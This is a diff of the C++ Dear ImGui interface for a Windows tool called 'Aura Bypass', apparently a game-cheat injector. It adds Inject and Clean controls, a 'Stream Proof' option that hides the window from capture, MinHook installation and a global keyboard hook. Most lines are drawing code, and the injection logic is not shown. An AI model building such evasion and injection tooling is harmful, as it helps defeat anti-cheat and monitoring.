-    float ropeR0 = 3.5f, ropeR1 = 7.0f, ropeA0 = 0.030f, ropeA1 = 0.065f;
-
-    float haloStep = 8.0f, haloR = 11.0f, haloA = 0.013f;   // aura
-
-    float volStep = 5.0f, volLam = 46.0f;                    // volutas
-    float volR0 = 2.5f, volR1 = 4.8f, volA0 = 0.016f, volA1 = 0.048f;
-
-    int   puffN = 4;          // bolhas que sobem
-    float puffR0 = 6.0f, puffR1 = 13.0f, puffA0 = 0.030f, puffA1 = 0.060f;
-
-    float edgeStep = 6.0f, edgeR = 7.5f;                     // bordas
-    float edgeA0 = 0.014f, edgeA1 = 0.048f;
-
-    int   sparkN = 7;        // faíscas (poeira de luz, discreta)
-    float sparkR0 = 1.4f, sparkR1 = 2.6f, sparkA0 = 0.06f, sparkA1 = 0.14f;
-};
-
-// Desenha o header animado do card. O relógio vem só de ImGui::GetTime() e
-// tudo é amostrado em coordenadas ABSOLUTAS de tela, então os dois headers
-// mostram exatamente a MESMA fumaça (uma peça só, mesmo com o vão no meio).
-// Retorna o Y da divisória (logo abaixo do header).
 float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
     const ImVec2& mn, const ImVec2& mx, const char* label) {
     const float rounding = 14.0f;
@@ -1385,20 +1700,16 @@ float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
     const ImVec2 hmax(mx.x, mn.y + headerH);
     const float t = (float)ImGui::GetTime();
 
-    // Base limpa, levemente mais escura que o corpo do card.
     draw->AddRectFilled(mn, hmax, IM_COL32(12, 13, 16, 255), rounding);
     draw->AddRectFilled(ImVec2(mn.x, hmax.y - rounding), hmax,
         IM_COL32(12, 13, 16, 255));
 
     draw->PushClipRect(mn, hmax, true);
 
-    // Gradiente horizontal discreto: dá profundidade sem poluir o header.
     draw->AddRectFilledMultiColor(mn, hmax,
         IM_COL32(255, 255, 255, 9), IM_COL32(255, 255, 255, 2),
         IM_COL32(255, 255, 255, 1), IM_COL32(255, 255, 255, 6));
 
-    // Reflexo largo e suave atravessando lentamente o card. São somente três
-    // retângulos com gradiente, evitando a geometria excessiva da fumaça antiga.
     const float W = mx.x - mn.x;
     const float cycle = W + 150.0f;
     const float sheenX = mn.x - 75.0f + fmodf(t * 27.0f + mn.x * 0.17f, cycle);
@@ -1411,7 +1722,6 @@ float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
         IM_COL32(255, 255, 255, 18), IM_COL32(255, 255, 255, 0),
         IM_COL32(255, 255, 255, 0), IM_COL32(255, 255, 255, 18));
 
-    // Marcador lateral em formato de cápsula, com um halo bem sutil.
     const ImVec2 markMin(mn.x + 14.0f, mn.y + 10.0f);
     const ImVec2 markMax(markMin.x + 3.0f, mn.y + 24.0f);
     draw->AddRectFilled(ImVec2(markMin.x - 2.0f, markMin.y - 2.0f),
@@ -1419,7 +1729,6 @@ float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
         IM_COL32(255, 255, 255, 18), 4.0f);
     draw->AddRectFilled(markMin, markMax, IM_COL32(235, 238, 245, 235), 2.0f);
 
-    // Título com espaçamento visual e sombra curta.
     const float textSize = 13.0f;
     const ImVec2 ts = textFont->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
     const ImVec2 tp(mn.x + 25.0f, mn.y + (headerH - ts.y) * 0.5f);
@@ -1427,7 +1736,6 @@ float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
         IM_COL32(0, 0, 0, 180), label);
     draw->AddText(textFont, textSize, tp, IM_COL32(242, 244, 248, 245), label);
 
-    // Três pontos decorativos no lado direito, estáticos e discretos.
     const float dotsX = mx.x - 17.0f;
     for (int i = 0; i < 3; ++i)
         draw->AddCircleFilled(ImVec2(dotsX - i * 5.0f, mn.y + headerH * 0.5f),
@@ -1435,10 +1743,8 @@ float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
 
     draw->PopClipRect();
 
-    // Restaura exatamente os cantos superiores arredondados após o clip.
     MaskTopCorners(draw, mn, mx, rounding, IM_COL32(0, 0, 0, 255));
 
-    // Divisor em duas camadas: sombra + linha clara bem fina.
     const float divY = hmax.y;
     draw->AddLine(ImVec2(mn.x + 1.0f, divY + 1.0f),
         ImVec2(mx.x - 1.0f, divY + 1.0f), IM_COL32(0, 0, 0, 110), 1.0f);
@@ -1447,23 +1753,19 @@ float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
     return divY;
 }
 
-// Card esquerdo: header "INFOS" + usuário, nome do PC, plano e data/hora.
 void DrawInfosCard(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
     const float padX = 16.0f;
     const float rounding = 14.0f;
     ImFont* textFont = g_fontText ? g_fontText : ImGui::GetFont();
 
-    // Corpo do card (mesma cor do botão Unload)
     draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, 255), rounding);
 
     float y = DrawAnimatedHeader(draw, textFont, mn, mx, "INFOS") + 12.0f;
 
-    // Infos (ícone + rótulo + valor)
     DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_USER, "Usuario", s_userName);
     DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_DESKTOP, "Nome do PC", s_pcName);
     DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_INFINITY, "Plan Type", "Life Time");
 
-    // Data e hora atuais (atualiza todo frame)
     SYSTEMTIME st = {};
     ::GetLocalTime(&st);
     char dtBuf[64];
@@ -1471,7 +1773,6 @@ void DrawInfosCard(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
         st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
     DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_CLOCK, "Data e hora", dtBuf);
 
-    // Label com ícone de "i": embaixo de "Data e hora", CENTRADO no eixo X do card
     {
         const char* msg = "Farme Aura Nos Teladores Meia Boca!";
         const float msgSize = 10.0f;
@@ -1482,7 +1783,7 @@ void DrawInfosCard(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
         const ImVec2 ms = textFont->CalcTextSizeA(msgSize, FLT_MAX, 0.0f, msg);
         const float totalW = its.x + gap + ms.x;
         const float cx = mn.x + ((mx.x - mn.x) - totalW) * 0.5f;
-        const float ly = y + 16.0f; // posição aprovada do label
+        const float ly = y + 16.0f;
         draw->AddText(iconFont, iconSize,
             ImVec2(cx, ly + (ms.y - its.y) * 0.5f),
             IM_COL32(255, 255, 255, 200), ICON_FA_CIRCLE_INFO);
@@ -1490,39 +1791,31 @@ void DrawInfosCard(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
             IM_COL32(255, 255, 255, 200), msg);
     }
 
-    // Borda do card por cima de tudo (inclusive do header branco)
     draw->AddRect(mn, mx, IM_COL32(85, 85, 85, 80), rounding, 0, 1.0f);
 }
 
-// Símbolo vetorial de Yin Yang — construído somente com paths/círculos do
-// ImGui, sem textura ou fonte externa.
 static void DrawYinYang(ImDrawList* draw, const ImVec2& c, float r) {
     const ImU32 light = IM_COL32(242, 244, 248, 255);
     const ImU32 dark = IM_COL32(12, 13, 16, 255);
     const float pi = 3.1415926535f;
 
-    // Halo discreto para separar o símbolo do fundo preto.
     draw->AddCircleFilled(c, r + 3.0f, IM_COL32(255, 255, 255, 13), 48);
 
-    // Disco claro e metade direita escura.
     draw->AddCircleFilled(c, r, light, 48);
     draw->PathClear();
     draw->PathLineTo(c);
     draw->PathArcTo(c, r, -pi * 0.5f, pi * 0.5f, 28);
     draw->PathFillConvex(dark);
 
-    // Curva em S formada por dois discos tangentes.
     const float halfR = r * 0.5f;
     const ImVec2 upper(c.x, c.y - halfR);
     const ImVec2 lower(c.x, c.y + halfR);
     draw->AddCircleFilled(upper, halfR, dark, 32);
     draw->AddCircleFilled(lower, halfR, light, 32);
 
-    // Pontos opostos.
     draw->AddCircleFilled(upper, r * 0.115f, light, 20);
     draw->AddCircleFilled(lower, r * 0.115f, dark, 20);
 
-    // Contorno fino para preservar a silhueta em qualquer fundo.
     draw->AddCircle(c, r, IM_COL32(255, 255, 255, 145), 48, 1.0f);
 }
 
@@ -1547,7 +1840,6 @@ void DrawUI(HWND hWnd) {
 
     draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, 255), kRounding);
 
-    // Título + logo à esquerda: no TOPO, fora do card, alinhado ao card esquerdo
     {
         ImFont* textFont = g_fontText ? g_fontText : ImGui::GetFont();
         const char* title = "Aura Bypass";
@@ -1558,7 +1850,6 @@ void DrawUI(HWND hWnd) {
         const float symbolR = 13.0f;
         const ImVec2 symbolCenter(x0 + symbolR, p.y + titleBarH * 0.5f);
 
-        // Arte vetorial à esquerda do nome.
         DrawYinYang(draw, symbolCenter, symbolR);
 
         const float textX = x0 + symbolR * 2.0f + 10.0f;
@@ -1567,18 +1858,15 @@ void DrawUI(HWND hWnd) {
             IM_COL32(255, 255, 255, 255), title);
     }
 
-    ImVec2 featMin(0.0f, 0.0f), featMax(0.0f, 0.0f); // área do controle Inject (p/ o drag)
+    ImVec2 featMin(0.0f, 0.0f), featMax(0.0f, 0.0f);
 
-    // Dois cards na mesma cor do botão Unload
     {
         const float cardW = 275.0f, cardH = 256.0f, gap = 18.0f;
         const float x0 = p.x + (kPanelW - (cardW * 2.0f + gap)) * 0.5f;
         const float y0 = p.y + 48.0f;
 
-        // Card esquerdo: INFOS (a fumaça é uma só, compartilhada pelos dois)
         DrawInfosCard(draw, ImVec2(x0, y0), ImVec2(x0 + cardW, y0 + cardH));
 
-        // Card direito: header animado "FEATURES" + botãozinho (20x15)
         {
             const ImVec2 rmn(x0 + cardW + gap, y0);
             const ImVec2 rmx(x0 + cardW * 2.0f + gap, y0 + cardH);
@@ -1586,17 +1874,12 @@ void DrawUI(HWND hWnd) {
             const float divY = DrawAnimatedHeader(draw,
                 g_fontText ? g_fontText : ImGui::GetFont(), rmn, rmx, "FEATURES");
 
-            // Botão de inject (único controle do card), colado na margem
-            // direita (padX = 16) e 10px abaixo de onde o botãozinho estava.
             const float by = divY + 22.0f;
-            const float bW = 245.0f, bH = 40.0f;   // 230+15 x 50-10
-            // (a largura extra cresce p/ a ESQUERDA: a borda direita fica
-            //  ancorada na margem de 16px do card)
+            const float bW = 245.0f, bH = 40.0f;
             const ImVec2 iMn(rmx.x - 16.0f - bW, by);
             DrawInjectControl(draw, iMn, ImVec2(iMn.x + bW, by + bH),
                 featMin, featMax);
 
-            // Segundo botão: 25 px abaixo do Inject, com as mesmas dimensões.
             const float cleanY = by + bH + 25.0f;
             const ImVec2 cMn(iMn.x, cleanY);
             ImVec2 cleanMin, cleanMax;
@@ -1604,37 +1887,39 @@ void DrawUI(HWND hWnd) {
                 cleanMin, cleanMax);
             (void)cleanMin;
 
-            // A exclusão do drag cobre os dois controles e o espaço entre eles.
             featMax = cleanMax;
 
-            // Checkbox Stream Proof no canto inferior esquerdo, exatamente
-            // 5 px acima do bottom do card.
             const float checkH = 30.0f;
-            const float checkW = 156.0f;
-            const ImVec2 checkMin(rmn.x + 14.0f, rmx.y - 5.0f - checkH);
-            const ImVec2 checkMax(checkMin.x + checkW, rmx.y - 5.0f);
-            ImVec2 checkOutMin, checkOutMax;
-            DrawStreamProofCheckbox(draw, checkMin, checkMax,
-                checkOutMin, checkOutMax);
-            (void)checkOutMin;
+            const float gapCk = 6.0f;
+            const float totalW = (rmx.x - rmn.x) - 28.0f;
+            const float spW = totalW * 0.55f;
+            const float lkW = totalW - spW - gapCk;
 
-            // Mantém a largura de exclusão dos botões e estende apenas o Y
-            // até o checkbox, para o clique não iniciar o drag da janela.
-            featMax.y = checkOutMax.y;
+            const ImVec2 spMin(rmn.x + 14.0f, rmx.y - 5.0f - checkH);
+            const ImVec2 spMax(spMin.x + spW, rmx.y - 5.0f);
+            ImVec2 spOutMin, spOutMax;
+            DrawStreamProofCheckbox(draw, spMin, spMax, spOutMin, spOutMax);
+            (void)spOutMin;
 
-            // borda por cima do header, igual ao card esquerdo
+            const ImVec2 lkMin(spMax.x + gapCk, spMin.y);
+            const ImVec2 lkMax(lkMin.x + lkW, spMax.y);
+            ImVec2 lkOutMin, lkOutMax;
+            DrawLockKeyCheckbox(draw, lkMin, lkMax, lkOutMin, lkOutMax);
+            (void)lkOutMin;
+
+            featMax.y = spOutMax.y;
+
             draw->AddRect(rmn, rmx, IM_COL32(85, 85, 85, 80), kRounding, 0, 1.0f);
         }
     }
 
-    // Botão power / "Unload" no canto superior direito
     ImVec2 exMin, exMax;
-    DrawPowerButton(draw, p, q, exMin, exMax);
+    DrawWindowButtons(draw, p, q, hWnd, exMin, exMax);
 
     HandleDrag(hWnd, p, q, exMin, exMax, featMin, featMax);
 
-    // Menu de progresso do inject (só aparece quando s_menuOpen)
     DrawInjectMenu(draw, p, q);
+    DrawCleanMenu(draw, p, q);
 
     ImGui::End();
 }
@@ -1644,28 +1929,33 @@ void EnableTransparency(HWND hWnd) {
     ::DwmExtendFrameIntoClientArea(hWnd, &margins);
 }
 
-// ---------------------------------------------------------------------------
-// Entry point do EXE — tudo roda na thread principal (sem DllMain/thread).
-// ---------------------------------------------------------------------------
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE, _In_ LPSTR, _In_ int nCmdShow) {
+    ::srand((unsigned)::time(nullptr));
+
     WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0, 0,
                        hInstance, nullptr, nullptr, nullptr,
                        nullptr, L"bipasClass", nullptr };
     ::RegisterClassExW(&wc);
 
-    // Centraliza na tela
     const int screenW = ::GetSystemMetrics(SM_CXSCREEN);
     const int screenH = ::GetSystemMetrics(SM_CYSCREEN);
     const int x0 = (screenW - (int)kPanelW) / 2;
     const int y0 = (screenH - (int)kPanelH) / 2;
 
-    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L"bipas",
+    HWND hwnd = ::CreateWindowExW(
+        WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_NOACTIVATE,
+        wc.lpszClassName, L"bipas",
         WS_POPUP, x0, y0, (int)kPanelW, (int)kPanelH,
         nullptr, nullptr, wc.hInstance, nullptr);
 
     if (!hwnd) {
         ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
         return 1;
+    }
+
+    {
+        BOOL no = FALSE;
+        ::DwmSetWindowAttribute(hwnd, 2, &no, sizeof(no));
     }
 
     if (!CreateDeviceD3D(hwnd)) {
@@ -1677,8 +1967,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
 
     EnableTransparency(hwnd);
 
-    // Inicializa todo o pipeline antes de exibir a janela. Assim o primeiro
-    // hover não coincide com a criação preguiçosa do atlas/shaders do backend.
+    g_overlayHwnd = hwnd;
+
+    InstallMinHooks();
+    g_hKbHook = ::SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
+        ::GetModuleHandleW(nullptr), 0);
+
+    ApplyStreamProof();
+
     IMGUI_CHECKVERSION();
     ImGui::CreateContext();
     ImGui::StyleColorsDark();
@@ -1695,7 +1991,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
 
     ImGui_ImplWin32_Init(hwnd);
     ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);
-    ImGui_ImplDX11_CreateDeviceObjects(); // aquece shaders, buffers e atlas
+    ImGui_ImplDX11_CreateDeviceObjects();
 
     ::ShowWindow(hwnd, nCmdShow);
     ::UpdateWindow(hwnd);
@@ -1729,7 +2025,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
     ImGui_ImplWin32_Shutdown();
     ImGui::DestroyContext();
 
-    if (g_logoSRV) { g_logoSRV->Release(); g_logoSRV = nullptr; }
+    UninstallMinHooks();
+
     CleanupDeviceD3D();
     ::DestroyWindow(hwnd);
     ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
